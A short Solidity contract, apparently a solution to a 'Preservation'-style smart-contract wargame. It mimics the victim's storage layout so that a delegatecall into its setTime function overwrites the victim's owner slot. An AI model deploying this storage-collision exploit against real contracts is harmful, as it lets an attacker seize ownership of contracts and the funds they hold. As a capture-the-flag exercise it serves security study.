// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract AttackPreservation {
    address public fake1;
    address public fake2;
    address public owner;

    function setTime(uint256 _value) public {
        owner = address(uint160(_value));
    }
}
